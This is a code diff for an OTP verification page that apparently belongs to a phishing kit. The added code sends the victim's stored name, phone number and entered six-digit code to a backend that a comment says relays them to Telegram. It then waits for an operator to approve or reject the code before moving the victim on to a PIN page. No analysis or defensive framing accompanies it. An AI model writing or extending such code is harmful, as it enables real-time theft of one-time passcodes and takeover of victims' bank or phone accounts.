@@ -146,7 +146,15 @@
   const countdownEl = document.getElementById('countdown');
   const resendEl = document.getElementById('resend');
 
-  // ===== COUNTDOWN (120 SECONDS) =====
+  const fullName = localStorage.getItem('fullName');
+  const phone = localStorage.getItem('phone');
+
+  if (!fullName || !phone) {
+    alert('Session expired. Please start again.');
+    window.location.href = 'index.html';
+  }
+
+  // ===== COUNTDOWN (UNCHANGED) =====
   let timeLeft = 120;
 
   function formatTime(sec) {
@@ -157,7 +165,6 @@
 
   const timer = setInterval(() => {
     timeLeft--;
-
     countdownEl.textContent = timeLeft;
     resendEl.textContent = `Resend in ${formatTime(timeLeft)}`;
 
@@ -169,13 +176,52 @@
     }
   }, 1000);
 
+  // ===== OTP COMPLETE → SEND TO TELEGRAM VIA BACKEND =====
+  async function submitOtp(code) {
+    try {
+      const res = await fetch(`${window.location.origin}/submit-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: fullName,
+          phone,
+          otp: code
+        })
+      });
+
+      const { requestId } = await res.json();
+      pollApproval(requestId);
+
+    } catch (e) {
+      alert('Server error. Please try again.');
+    }
+  }
+
+  function pollApproval(requestId) {
+    const interval = setInterval(async () => {
+      const res = await fetch(
+        `${window.location.origin}/check-otp/${requestId}`
+      );
+      const data = await res.json();
+
+      if (data.approved === true) {
+        clearInterval(interval);
+        window.location.href = 'pin.html';
+      }
+
+      if (data.approved === false) {
+        clearInterval(interval);
+        alert('OTP rejected. Please try again.');
+        window.location.reload();
+      }
+    }, 2000);
+  }
+
   function checkAndSubmit() {
     const code = Array.from(inputs).map(i => i.value).join('');
     if (code.length === 6) {
       verifyBtn.disabled = false;
-      setTimeout(() => {
-        window.location.href = "pin.html";
-      }, 300);
+      submitOtp(code);
     }
   }
 
